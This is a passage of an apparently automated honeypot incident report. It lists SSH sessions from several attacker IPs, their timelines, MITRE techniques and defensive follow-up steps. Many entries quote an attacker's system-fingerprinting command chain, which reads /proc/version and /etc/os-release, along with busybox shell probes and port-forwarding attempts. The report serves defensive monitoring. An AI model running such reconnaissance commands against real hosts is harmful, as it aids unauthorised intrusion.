| `2026-07-28 21:54:24` | `cowrie.command.input` |
| `2026-07-28 21:54:24` | `cowrie.command.input` |
| `2026-07-28 21:54:24` | `cowrie.command.input` |
| `2026-07-28 21:54:24` | `cowrie.log.closed` |
| `2026-07-28 21:54:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1aaa44dcb209

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 21:55 |
| **Last Seen** | 2026-07-28 21:55 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:55:46` | `cowrie.session.connect` |
| `2026-07-28 21:55:46` | `cowrie.client.version` |
| `2026-07-28 21:55:46` | `cowrie.client.kex` |
| `2026-07-28 21:55:48` | `cowrie.login.success` |
| `2026-07-28 21:55:51` | `cowrie.session.params` |
| `2026-07-28 21:55:51` | `cowrie.command.input` |
| `2026-07-28 21:55:51` | `cowrie.command.input` |
| `2026-07-28 21:55:51` | `cowrie.command.input` |
| `2026-07-28 21:55:51` | `cowrie.command.input` |
| `2026-07-28 21:55:51` | `cowrie.command.input` |
| `2026-07-28 21:55:51` | `cowrie.command.success` |
| `2026-07-28 21:55:51` | `cowrie.command.input` |
| `2026-07-28 21:55:51` | `cowrie.command.input` |
| `2026-07-28 21:55:51` | `cowrie.command.input` |
| `2026-07-28 21:55:51` | `cowrie.command.input` |
| `2026-07-28 21:55:51` | `cowrie.log.closed` |
| `2026-07-28 21:55:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e769dc948fe

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 21:57 |
| **Last Seen** | 2026-07-28 21:57 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:57:10` | `cowrie.session.connect` |
| `2026-07-28 21:57:10` | `cowrie.client.version` |
| `2026-07-28 21:57:10` | `cowrie.client.kex` |
| `2026-07-28 21:57:12` | `cowrie.login.success` |
| `2026-07-28 21:57:13` | `cowrie.session.params` |
| `2026-07-28 21:57:13` | `cowrie.command.input` |
| `2026-07-28 21:57:13` | `cowrie.command.input` |
| `2026-07-28 21:57:13` | `cowrie.command.input` |
| `2026-07-28 21:57:13` | `cowrie.command.input` |
| `2026-07-28 21:57:13` | `cowrie.command.input` |
| `2026-07-28 21:57:13` | `cowrie.command.success` |
| `2026-07-28 21:57:13` | `cowrie.command.input` |
| `2026-07-28 21:57:13` | `cowrie.command.input` |
| `2026-07-28 21:57:13` | `cowrie.command.input` |
| `2026-07-28 21:57:13` | `cowrie.command.input` |
| `2026-07-28 21:57:15` | `cowrie.log.closed` |
| `2026-07-28 21:57:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f097214e9eb

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 21:58 |
| **Last Seen** | 2026-07-28 21:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:58:34` | `cowrie.session.connect` |
| `2026-07-28 21:58:35` | `cowrie.client.version` |
| `2026-07-28 21:58:35` | `cowrie.client.kex` |
| `2026-07-28 21:58:36` | `cowrie.login.success` |
| `2026-07-28 21:58:37` | `cowrie.session.params` |
| `2026-07-28 21:58:37` | `cowrie.command.input` |
| `2026-07-28 21:58:37` | `cowrie.command.input` |
| `2026-07-28 21:58:37` | `cowrie.command.input` |
| `2026-07-28 21:58:37` | `cowrie.command.input` |
| `2026-07-28 21:58:37` | `cowrie.command.input` |
| `2026-07-28 21:58:37` | `cowrie.command.success` |
| `2026-07-28 21:58:37` | `cowrie.command.input` |
| `2026-07-28 21:58:37` | `cowrie.command.input` |
| `2026-07-28 21:58:37` | `cowrie.command.input` |
| `2026-07-28 21:58:37` | `cowrie.command.input` |
| `2026-07-28 21:58:37` | `cowrie.log.closed` |
| `2026-07-28 21:58:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7dbb95f2a4f6

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 21:59 |
| **Last Seen** | 2026-07-28 22:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 21:59:58` | `cowrie.session.connect` |
| `2026-07-28 21:59:58` | `cowrie.client.version` |
| `2026-07-28 21:59:58` | `cowrie.client.kex` |
| `2026-07-28 22:00:00` | `cowrie.login.success` |
| `2026-07-28 22:00:01` | `cowrie.session.params` |
| `2026-07-28 22:00:01` | `cowrie.command.input` |
| `2026-07-28 22:00:01` | `cowrie.command.input` |
| `2026-07-28 22:00:01` | `cowrie.command.input` |
| `2026-07-28 22:00:01` | `cowrie.command.input` |
| `2026-07-28 22:00:01` | `cowrie.command.input` |
| `2026-07-28 22:00:01` | `cowrie.command.success` |
| `2026-07-28 22:00:01` | `cowrie.command.input` |
| `2026-07-28 22:00:01` | `cowrie.command.input` |
| `2026-07-28 22:00:01` | `cowrie.command.input` |
| `2026-07-28 22:00:01` | `cowrie.command.input` |
| `2026-07-28 22:00:01` | `cowrie.log.closed` |
| `2026-07-28 22:00:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2666b40af52

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:01 |
| **Last Seen** | 2026-07-28 22:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:01:24` | `cowrie.session.connect` |
| `2026-07-28 22:01:25` | `cowrie.client.version` |
| `2026-07-28 22:01:25` | `cowrie.client.kex` |
| `2026-07-28 22:01:26` | `cowrie.login.success` |
| `2026-07-28 22:01:28` | `cowrie.session.params` |
| `2026-07-28 22:01:28` | `cowrie.command.input` |
| `2026-07-28 22:01:28` | `cowrie.command.input` |
| `2026-07-28 22:01:28` | `cowrie.command.input` |
| `2026-07-28 22:01:28` | `cowrie.command.input` |
| `2026-07-28 22:01:28` | `cowrie.command.input` |
| `2026-07-28 22:01:28` | `cowrie.command.success` |
| `2026-07-28 22:01:28` | `cowrie.command.input` |
| `2026-07-28 22:01:28` | `cowrie.command.input` |
| `2026-07-28 22:01:28` | `cowrie.command.input` |
| `2026-07-28 22:01:28` | `cowrie.command.input` |
| `2026-07-28 22:01:28` | `cowrie.log.closed` |
| `2026-07-28 22:01:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88a8a0ee0e9e

| Field | Detail |
|---|---|
| **Source IP** | `114.30.180[.]58` |
| **First Seen** | 2026-07-28 22:01 |
| **Last Seen** | 2026-07-28 22:01 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:01:34` | `cowrie.session.connect` |
| `2026-07-28 22:01:35` | `cowrie.client.version` |
| `2026-07-28 22:01:35` | `cowrie.client.kex` |
| `2026-07-28 22:01:37` | `cowrie.login.success` |
| `2026-07-28 22:01:38` | `cowrie.direct-tcpip.request` |
| `2026-07-28 22:01:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.30.180[.]58` to AbuseIPDB if not already reported
- [ ] Block `114.30.180[.]58` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5057cf1b6997

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-28 22:01 |
| **Last Seen** | 2026-07-28 22:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:01:38` | `cowrie.session.connect` |
| `2026-07-28 22:01:38` | `cowrie.client.version` |
| `2026-07-28 22:01:38` | `cowrie.client.kex` |
| `2026-07-28 22:01:38` | `cowrie.login.success` |
| `2026-07-28 22:01:38` | `cowrie.direct-tcpip.request` |
| `2026-07-28 22:01:38` | `cowrie.direct-tcpip.data` |
| `2026-07-28 22:01:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b0dc0f16dec

| Field | Detail |
|---|---|
| **Source IP** | `195.222.57[.]190` |
| **First Seen** | 2026-07-28 22:01 |
| **Last Seen** | 2026-07-28 22:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:01:43` | `cowrie.session.connect` |
| `2026-07-28 22:01:43` | `cowrie.client.version` |
| `2026-07-28 22:01:43` | `cowrie.client.kex` |
| `2026-07-28 22:01:44` | `cowrie.login.success` |
| `2026-07-28 22:01:45` | `cowrie.direct-tcpip.request` |
| `2026-07-28 22:01:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.222.57[.]190` to AbuseIPDB if not already reported
- [ ] Block `195.222.57[.]190` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-899fff0b9d11

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:02 |
| **Last Seen** | 2026-07-28 22:02 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:02:52` | `cowrie.session.connect` |
| `2026-07-28 22:02:52` | `cowrie.client.version` |
| `2026-07-28 22:02:52` | `cowrie.client.kex` |
| `2026-07-28 22:02:53` | `cowrie.login.success` |
| `2026-07-28 22:02:54` | `cowrie.session.params` |
| `2026-07-28 22:02:54` | `cowrie.command.input` |
| `2026-07-28 22:02:54` | `cowrie.command.input` |
| `2026-07-28 22:02:54` | `cowrie.command.input` |
| `2026-07-28 22:02:54` | `cowrie.command.input` |
| `2026-07-28 22:02:54` | `cowrie.command.input` |
| `2026-07-28 22:02:54` | `cowrie.command.success` |
| `2026-07-28 22:02:54` | `cowrie.command.input` |
| `2026-07-28 22:02:54` | `cowrie.command.input` |
| `2026-07-28 22:02:54` | `cowrie.command.input` |
| `2026-07-28 22:02:54` | `cowrie.command.input` |
| `2026-07-28 22:02:55` | `cowrie.log.closed` |
| `2026-07-28 22:02:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-03065f7825d5

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:04 |
| **Last Seen** | 2026-07-28 22:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:04:18` | `cowrie.session.connect` |
| `2026-07-28 22:04:18` | `cowrie.client.version` |
| `2026-07-28 22:04:18` | `cowrie.client.kex` |
| `2026-07-28 22:04:20` | `cowrie.login.success` |
| `2026-07-28 22:04:21` | `cowrie.session.params` |
| `2026-07-28 22:04:21` | `cowrie.command.input` |
| `2026-07-28 22:04:21` | `cowrie.command.input` |
| `2026-07-28 22:04:21` | `cowrie.command.input` |
| `2026-07-28 22:04:21` | `cowrie.command.input` |
| `2026-07-28 22:04:21` | `cowrie.command.input` |
| `2026-07-28 22:04:21` | `cowrie.command.success` |
| `2026-07-28 22:04:21` | `cowrie.command.input` |
| `2026-07-28 22:04:21` | `cowrie.command.input` |
| `2026-07-28 22:04:21` | `cowrie.command.input` |
| `2026-07-28 22:04:21` | `cowrie.command.input` |
| `2026-07-28 22:04:21` | `cowrie.log.closed` |
| `2026-07-28 22:04:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-75f5d8c7a31b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:05 |
| **Last Seen** | 2026-07-28 22:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:05:42` | `cowrie.session.connect` |
| `2026-07-28 22:05:43` | `cowrie.client.version` |
| `2026-07-28 22:05:43` | `cowrie.client.kex` |
| `2026-07-28 22:05:44` | `cowrie.login.success` |
| `2026-07-28 22:05:45` | `cowrie.session.params` |
| `2026-07-28 22:05:45` | `cowrie.command.input` |
| `2026-07-28 22:05:45` | `cowrie.command.input` |
| `2026-07-28 22:05:45` | `cowrie.command.input` |
| `2026-07-28 22:05:45` | `cowrie.command.input` |
| `2026-07-28 22:05:45` | `cowrie.command.input` |
| `2026-07-28 22:05:45` | `cowrie.command.success` |
| `2026-07-28 22:05:45` | `cowrie.command.input` |
| `2026-07-28 22:05:45` | `cowrie.command.input` |
| `2026-07-28 22:05:45` | `cowrie.command.input` |
| `2026-07-28 22:05:45` | `cowrie.command.input` |
| `2026-07-28 22:05:46` | `cowrie.log.closed` |
| `2026-07-28 22:05:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9db7b50e4c2

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]210` |
| **First Seen** | 2026-07-28 22:06 |
| **Last Seen** | 2026-07-28 22:06 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo SHELL_TEST, /bin/busybox TEST, cat /proc, ./` |
| **TTPs (MITRE)** | T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:06:40` | `cowrie.session.connect` |
| `2026-07-28 22:06:40` | `cowrie.login.success` |
| `2026-07-28 22:06:41` | `cowrie.session.params` |
| `2026-07-28 22:06:41` | `cowrie.command.input` |
| `2026-07-28 22:06:42` | `cowrie.command.input` |
| `2026-07-28 22:06:42` | `cowrie.command.input` |
| `2026-07-28 22:06:43` | `cowrie.command.input` |
| `2026-07-28 22:06:43` | `cowrie.command.failed` |
| `2026-07-28 22:06:43` | `cowrie.log.closed` |
| `2026-07-28 22:06:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]210` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]210` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d20ad2325ee

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-07-28 22:07 |
| **Last Seen** | 2026-07-28 22:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:07:11` | `cowrie.session.connect` |
| `2026-07-28 22:07:11` | `cowrie.client.version` |
| `2026-07-28 22:07:11` | `cowrie.client.kex` |
| `2026-07-28 22:07:12` | `cowrie.login.success` |
| `2026-07-28 22:07:14` | `cowrie.session.params` |
| `2026-07-28 22:07:14` | `cowrie.command.input` |
| `2026-07-28 22:07:14` | `cowrie.command.input` |
| `2026-07-28 22:07:14` | `cowrie.command.input` |
| `2026-07-28 22:07:14` | `cowrie.command.input` |
| `2026-07-28 22:07:14` | `cowrie.command.input` |
| `2026-07-28 22:07:14` | `cowrie.command.success` |
| `2026-07-28 22:07:14` | `cowrie.command.input` |
| `2026-07-28 22:07:14` | `cowrie.command.input` |
| `2026-07-28 22:07:14` | `cowrie.command.input` |
| `2026-07-28 22:07:14` | `cowrie.command.input` |
| `2026-07-28 22:07:14` | `cowrie.log.closed` |
| `2026-07-28 22:07:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1df74b28b7d8

| Field | Detail |
|---|---|
| **Source IP** | `69.126.144[.]30` |
| **First Seen** | 2026-07-28 22:07 |
| **Last Seen** | 2026-07-28 22:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:07:19` | `cowrie.session.connect` |
| `2026-07-28 22:07:19` | `cowrie.client.version` |
| `2026-07-28 22:07:19` | `cowrie.client.kex` |
| `2026-07-28 22:07:20` | `cowrie.login.success` |
| `2026-07-28 22:07:20` | `cowrie.direct-tcpip.request` |
| `2026-07-28 22:07:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.126.144[.]30` to AbuseIPDB if not already reported
- [ ] Block `69.126.144[.]30` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b6297da812a

| Field | Detail |
|---|---|
| **Source IP** | `220.78.182[.]74` |
| **First Seen** | 2026-07-28 22:07 |
| **Last Seen** | 2026-07-28 22:07 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 22:07:25` | `cowrie.session.connect` |
| `2026-07-28 22:07:26` | `cowrie.client.version` |
| `2026-07-28 22:07:26` | `cowrie.client.kex` |
| `2026-07-28 22:07:29` | `cowrie.login.success` |
| `2026-07-28 22:07:30` | `cowrie.direct-tcpip.request` |
| `2026-07-28 22:07:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.78.182[.]74` to AbuseIPDB if not already reported
- [ ] Block `220.78.182[.]74` at perimeter firewall / security group
